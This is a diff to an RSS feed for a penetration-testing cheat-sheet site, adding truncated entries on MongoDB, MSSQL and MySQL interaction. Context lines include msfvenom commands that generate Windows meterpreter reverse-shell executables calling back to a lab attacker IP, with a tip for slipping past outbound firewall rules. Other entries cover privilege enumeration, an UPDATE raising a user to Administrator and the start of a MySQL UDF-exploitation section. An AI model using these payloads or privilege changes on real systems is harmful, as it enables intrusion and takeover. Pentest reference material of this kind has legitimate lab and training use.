@@ -50,6 +50,13 @@
       <description>SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:user password # From target Windows to local Linux copy test.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\test.txt test.txt # Delete file del test.txt # Remove SMB share net use /d \\10.13.14.10\share Base64 Encoding (for small binary) # In target Windows [System.</description>
     </item>
     <item>
+      <title>Java Environment</title>
+      <link>https://tldrbins.github.io/java_environment/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/java_environment/</guid>
+      <description> Set JDK Environment sudo update-alternatives --config java sudo update-alternatives --config javac </description>
+    </item>
+    <item>
       <title>Listeners</title>
       <link>https://tldrbins.github.io/listeners/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -69,6 +76,27 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/metasploit_shellcode/</guid>
       <description>Generate Metasploit Shellcode Windows x64 EXE msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe Windows x86 EXE msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe Windows x64 DLL msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.dll Note 1: These will be flagged by AV Note 2: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</description>
+    </item>
+    <item>
+      <title>MongoDB Interaction</title>
+      <link>https://tldrbins.github.io/mongodb_interactoin/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/mongodb_interactoin/</guid>
+      <description> General Connect to Mongo Database mongo 10.10.11.10:27017 Basic Commands # Show all databases show dbs # Choose database use db_name # Show all collections show collections # Show all of the collection db.COLLECTION_NAME.find().pretty() </description>
+    </item>
+    <item>
+      <title>MSSQL Interaction</title>
+      <link>https://tldrbins.github.io/mssql_interactoin/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/mssql_interactoin/</guid>
+      <description>General Connect to MSSQL DB impacket-mssqlclient username:password@10.10.11.10 Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check privilege SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;SERVER&amp;#39;); # Show databases SELECT name FROM master..sysdatabases; # Show current database SELECT DB_NAME(); # List tables and schema select table_name,table_schema from db_name.INFORMATION_SCHEMA.TABLES; # Select all from table select * from db_name.</description>
+    </item>
+    <item>
+      <title>Mysql Interaction</title>
+      <link>https://tldrbins.github.io/mysql_interactoin/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/mysql_interactoin/</guid>
+      <description>General Connect to mysql Database # Database unknown mysql -u user -h 10.10.11.10 -p # Database known mysql -u user -D db_name -h 10.10.11.10 -p Basic Commands # Show all databases show databases; # Choose database use db_name; # Show all tables show tables; # Show all entries in table_name select * from table_name; Update Entry # Update Entry Example UPDATE users set user_type=&amp;#39;Administrator&amp;#39; where email=&amp;#39;test@example.com&amp;#39;; Exploitation User Defined Function (UDF) # Get the raptor_udf2.</description>
     </item>
     <item>
       <title>Network Discovery</title>
